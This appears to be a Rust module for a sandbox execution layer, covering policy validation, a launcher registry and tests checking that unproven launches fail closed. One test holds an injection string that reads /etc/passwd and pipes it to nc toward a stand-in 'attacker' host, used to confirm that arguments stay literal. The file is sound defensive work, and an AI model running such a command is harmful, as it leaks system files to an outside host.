use crate::{ArgAtom, ProcessCancellation, ProgramRef, SealedBindings};
use sim_kernel::{Error, Result};
use std::{
    collections::{BTreeMap, BTreeSet},
    sync::Arc,
};

const MAX_MOUNTS: usize = 64;
const MAX_STDIN: usize = 16 * 1024 * 1024;

/// One independently provable sandbox control.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum SandboxControl {
    /// Network namespace and interfaces.
    Network,
    /// Visible filesystem mounts.
    Mounts,
    /// Filesystem root and working root.
    Root,
    /// Child process environment.
    Environment,
    /// Host user and session identity.
    Identity,
    /// CPU time.
    Cpu,
    /// Address-space memory.
    Memory,
    /// Monotonic wall time.
    WallTime,
    /// Descendant process count.
    ProcessCount,
    /// Created file count.
    FileCount,
    /// Created file bytes.
    FileBytes,
    /// Captured output bytes.
    Output,
    /// Standard-input bytes.
    Stdin,
    /// Descendant cleanup.
    ProcessTree,
}

/// Whether absence of a control is fatal or may be reported as unavailable.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SandboxRequirement {
    /// Refuse before execution when the launcher cannot prove this control.
    Required,
    /// Execute when possible and report whether this control was achieved.
    BestEffort,
}

/// Access granted to a declared mount.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MountAccess {
    /// Input visible without mutation authority.
    ReadOnly,
    /// Explicit output root.
    Writable,
}

/// Opaque boot-resolved source mounted at a fixed absolute guest path.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxMount {
    /// Opaque boot-authorized source identity.
    pub source: String,
    /// Absolute path inside the anonymous sandbox root.
    pub guest_path: String,
    /// Requested access.
    pub access: MountAccess,
}

/// Complete bounded resource policy. Zero is invalid for every limit.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxLimits {
    /// CPU seconds.
    pub cpu_seconds: u64,
    /// Address-space bytes.
    pub memory_bytes: u64,
    /// Monotonic milliseconds.
    pub wall_time_ms: u64,
    /// Maximum process count.
    pub process_count: u64,
    /// Maximum files across writable roots.
    pub file_count: u64,
    /// Maximum bytes across writable roots.
    pub file_bytes: u64,
    /// Shared stdout and stderr cap.
    pub output_bytes: usize,
    /// Standard-input cap.
    pub stdin_bytes: usize,
}

/// Validated portable sandbox policy, independent of any OS launcher.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxPolicy {
    requirements: BTreeMap<SandboxControl, SandboxRequirement>,
    mounts: Vec<SandboxMount>,
    limits: SandboxLimits,
}
impl SandboxPolicy {
    pub fn new(
        requirements: impl IntoIterator<Item = (SandboxControl, SandboxRequirement)>,
        mounts: Vec<SandboxMount>,
        limits: SandboxLimits,
    ) -> Result<Self> {
        let requirements = requirements.into_iter().collect::<BTreeMap<_, _>>();
        let all = [
            SandboxControl::Network,
            SandboxControl::Mounts,
            SandboxControl::Root,
            SandboxControl::Environment,
            SandboxControl::Identity,
            SandboxControl::Cpu,
            SandboxControl::Memory,
            SandboxControl::WallTime,
            SandboxControl::ProcessCount,
            SandboxControl::FileCount,
            SandboxControl::FileBytes,
            SandboxControl::Output,
            SandboxControl::Stdin,
            SandboxControl::ProcessTree,
        ];
        if all.iter().any(|c| !requirements.contains_key(c)) {
            return Err(Error::Eval(
                "sandbox policy must classify every control".into(),
            ));
        }
        if mounts.len() > MAX_MOUNTS {
            return Err(Error::Eval("too many sandbox mounts".into()));
        }
        let mut guests = BTreeSet::new();
        for mount in &mounts {
            if mount.source.is_empty()
                || !mount.guest_path.starts_with('/')
                || mount.guest_path.contains("..")
                || mount.guest_path.contains('\0')
                || !guests.insert(&mount.guest_path)
            {
                return Err(Error::Eval("invalid or duplicate sandbox mount".into()));
            }
        }
        if limits.cpu_seconds == 0
            || limits.memory_bytes == 0
            || limits.wall_time_ms == 0
            || limits.process_count == 0
            || limits.file_count == 0
            || limits.file_bytes == 0
            || limits.output_bytes == 0
            || limits.stdin_bytes == 0
            || limits.stdin_bytes > MAX_STDIN
        {
            return Err(Error::Eval(
                "sandbox limits must be non-zero and bounded".into(),
            ));
        }
        Ok(Self {
            requirements,
            mounts,
            limits,
        })
    }
    /// Returns the complete requested-control map.
    pub fn requirements(&self) -> &BTreeMap<SandboxControl, SandboxRequirement> {
        &self.requirements
    }
    /// Returns declared mounts only.
    pub fn mounts(&self) -> &[SandboxMount] {
        &self.mounts
    }
    /// Returns the validated resource limits.
    pub fn limits(&self) -> &SandboxLimits {
        &self.limits
    }
}

/// Fully validated untrusted-process request. Arguments remain literal atoms.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxRequest {
    /// Boot-authorized executable identity.
    pub program: ProgramRef,
    /// Literal, unsplit argument atoms.
    pub argv: Vec<ArgAtom>,
    /// Empty-by-default exact environment.
    pub environment: SealedBindings,
    /// Bounded standard input.
    pub stdin: Vec<u8>,
    /// Validated complete sandbox policy.
    pub policy: SandboxPolicy,
}
impl SandboxRequest {
    /// Validates and creates a sandbox request.
    pub fn new(
        program: ProgramRef,
        argv: Vec<ArgAtom>,
        environment: SealedBindings,
        stdin: Vec<u8>,
        policy: SandboxPolicy,
    ) -> Result<Self> {
        if stdin.len() > policy.limits.stdin_bytes {
            return Err(Error::Eval("sandbox stdin exceeds policy".into()));
        }
        Ok(Self {
            program,
            argv,
            environment,
            stdin,
            policy,
        })
    }
}

/// Evidence for one requested control; only launchers may assert `achieved`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxEvidence {
    /// Requested control.
    pub control: SandboxControl,
    /// True only when backed by launcher evidence.
    pub achieved: bool,
    /// Non-secret operational proof.
    pub detail: String,
}
/// Requested-versus-achieved report plus every operational limit event.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxReport {
    /// Registered launcher identity.
    pub launcher: String,
    /// Requested-versus-achieved control evidence.
    pub controls: Vec<SandboxEvidence>,
    /// Resource hits and truncations.
    pub limit_hits: Vec<String>,
    /// Process-tree cleanup evidence.
    pub cleanup: String,
}
impl SandboxReport {
    /// Returns whether every required control has positive, non-empty evidence.
    pub fn proves_required(&self, policy: &SandboxPolicy) -> bool {
        policy.requirements.iter().all(|(control, requirement)| {
            *requirement != SandboxRequirement::Required
                || self
                    .controls
                    .iter()
                    .any(|e| e.control == *control && e.achieved && !e.detail.is_empty())
        })
    }
}
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxResult {
    /// Bounded standard output.
    pub stdout: Vec<u8>,
    /// Bounded standard error.
    pub stderr: Vec<u8>,
    /// Exit status or -1 when unavailable.
    pub exit_code: i32,
    /// Auditable control and resource evidence.
    pub report: SandboxReport,
}
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxRefusal {
    /// Selected launcher identity.
    pub launcher: String,
    /// Bounded refusal reason.
    pub reason: String,
    /// Partial evidence, only when execution reached control realization.
    pub report: Option<SandboxReport>,
}
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum SandboxAttempt {
    /// Completed with a report.
    Completed(SandboxResult),
    /// Proven not dispatched.
    Refused(SandboxRefusal),
    /// Timeout or cancellation with proven cleanup.
    Stopped(SandboxReport),
    /// Dispatched but final state is not provable.
    Unknown(SandboxRefusal),
}

/// Replaceable object-safe untrusted-process authority boundary.
pub trait SandboxLauncher: Send + Sync {
    fn id(&self) -> &str;
    fn launch(
        &self,
        request: &SandboxRequest,
        cancellation: &ProcessCancellation,
    ) -> SandboxAttempt;
}
/// Boot-built launcher registry; callers select an identity, never a concrete OS type.
#[derive(Default)]
pub struct LauncherRegistry(BTreeMap<String, Arc<dyn SandboxLauncher>>);
impl LauncherRegistry {
    /// Registers one unique boot-selected launcher.
    pub fn register(&mut self, launcher: Arc<dyn SandboxLauncher>) -> Result<()> {
        let id = launcher.id();
        if id.is_empty() || self.0.contains_key(id) {
            return Err(Error::Eval("invalid or duplicate sandbox launcher".into()));
        }
        self.0.insert(id.into(), launcher);
        Ok(())
    }
    /// Dispatches through the selected launcher without caller type dispatch.
    pub fn launch(
        &self,
        id: &str,
        request: &SandboxRequest,
        cancellation: &ProcessCancellation,
    ) -> SandboxAttempt {
        self.0.get(id).map_or_else(
            || {
                SandboxAttempt::Refused(SandboxRefusal {
                    launcher: id.into(),
                    reason: "sandbox launcher is not registered".into(),
                    report: None,
                })
            },
            |v| v.launch(request, cancellation),
        )
    }
}
/// Runs an untrusted request and rejects any completion lacking required proof.
pub fn sandbox_exec(
    registry: &LauncherRegistry,
    launcher: &str,
    request: &SandboxRequest,
    cancellation: &ProcessCancellation,
) -> Result<SandboxResult> {
    match registry.launch(launcher, request, cancellation) {
        SandboxAttempt::Completed(result) if result.report.proves_required(&request.policy) => {
            Ok(result)
        }
        SandboxAttempt::Completed(_) => Err(Error::HostError(
            "sandbox launcher claimed completion without required evidence".into(),
        )),
        attempt => Err(Error::HostError(format!("sandbox attempt: {attempt:?}"))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    struct Fake(&'static str);
    impl SandboxLauncher for Fake {
        fn id(&self) -> &str {
            self.0
        }
        fn launch(&self, request: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
            SandboxAttempt::Completed(SandboxResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
                report: SandboxReport {
                    launcher: self.0.into(),
                    controls: request
                        .policy
                        .requirements
                        .keys()
                        .map(|control| SandboxEvidence {
                            control: *control,
                            achieved: true,
                            detail: "fake proof".into(),
                        })
                        .collect(),
                    limit_hits: vec![],
                    cleanup: "no descendants".into(),
                },
            })
        }
    }
    struct Liar;
    impl SandboxLauncher for Liar {
        fn id(&self) -> &str {
            "liar"
        }
        fn launch(&self, _: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
            SandboxAttempt::Completed(SandboxResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
                report: SandboxReport {
                    launcher: "liar".into(),
                    controls: vec![],
                    limit_hits: vec![],
                    cleanup: String::new(),
                },
            })
        }
    }
    fn policy() -> SandboxPolicy {
        let controls = [
            SandboxControl::Network,
            SandboxControl::Mounts,
            SandboxControl::Root,
            SandboxControl::Environment,
            SandboxControl::Identity,
            SandboxControl::Cpu,
            SandboxControl::Memory,
            SandboxControl::WallTime,
            SandboxControl::ProcessCount,
            SandboxControl::FileCount,
            SandboxControl::FileBytes,
            SandboxControl::Output,
            SandboxControl::Stdin,
            SandboxControl::ProcessTree,
        ];
        SandboxPolicy::new(
            controls
                .into_iter()
                .map(|c| (c, SandboxRequirement::Required)),
            vec![],
            SandboxLimits {
                cpu_seconds: 1,
                memory_bytes: 1,
                wall_time_ms: 1,
                process_count: 1,
                file_count: 1,
                file_bytes: 1,
                output_bytes: 1,
                stdin_bytes: 1,
            },
        )
        .unwrap()
    }
    #[test]
    fn registered_launchers_are_dispatch_independent_and_fail_closed() {
        let request = SandboxRequest::new(
            ProgramRef::new("tool").unwrap(),
            vec![],
            SealedBindings::empty(),
            vec![],
            policy(),
        )
        .unwrap();
        let mut registry = LauncherRegistry::default();
        registry.register(Arc::new(Fake("one"))).unwrap();
        registry.register(Arc::new(Fake("two"))).unwrap();
        assert_eq!(
            sandbox_exec(&registry, "one", &request, &Default::default())
                .unwrap()
                .report
                .launcher,
            "one"
        );
        assert_eq!(
            sandbox_exec(&registry, "two", &request, &Default::default())
                .unwrap()
                .report
                .launcher,
            "two"
        );
        assert!(sandbox_exec(&registry, "missing", &request, &Default::default()).is_err());
        registry.register(Arc::new(Liar)).unwrap();
        assert!(sandbox_exec(&registry, "liar", &request, &Default::default()).is_err());
    }
    #[test]
    fn hostile_paths_stdin_and_arguments_are_validated_without_shell_parsing() {
        let limits = SandboxLimits {
            cpu_seconds: 1,
            memory_bytes: 1,
            wall_time_ms: 1,
            process_count: 1,
            file_count: 1,
            file_bytes: 1,
            output_bytes: 1,
            stdin_bytes: 1,
        };
        let controls = [
            SandboxControl::Network,
            SandboxControl::Mounts,
            SandboxControl::Root,
            SandboxControl::Environment,
            SandboxControl::Identity,
            SandboxControl::Cpu,
            SandboxControl::Memory,
            SandboxControl::WallTime,
            SandboxControl::ProcessCount,
            SandboxControl::FileCount,
            SandboxControl::FileBytes,
            SandboxControl::Output,
            SandboxControl::Stdin,
            SandboxControl::ProcessTree,
        ];
        assert!(
            SandboxPolicy::new(
                controls
                    .into_iter()
                    .map(|c| (c, SandboxRequirement::Required)),
                vec![SandboxMount {
                    source: "input".into(),
                    guest_path: "/work/../etc".into(),
                    access: MountAccess::ReadOnly
                }],
                limits.clone()
            )
            .is_err()
        );
        let policy = SandboxPolicy::new(
            controls
                .into_iter()
                .map(|c| (c, SandboxRequirement::Required)),
            vec![],
            limits,
        )
        .unwrap();
        assert!(
            SandboxRequest::new(
                ProgramRef::new("tool").unwrap(),
                vec![],
                SealedBindings::empty(),
                vec![1, 2],
                policy.clone()
            )
            .is_err()
        );
        let atom = ArgAtom::new("; cat /etc/passwd | nc attacker 1").unwrap();
        let request = SandboxRequest::new(
            ProgramRef::new("tool").unwrap(),
            vec![atom],
            SealedBindings::empty(),
            vec![],
            policy,
        )
        .unwrap();
        assert_eq!(
            request.argv[0].as_str(),
            "; cat /etc/passwd | nc attacker 1"
        );
    }
}
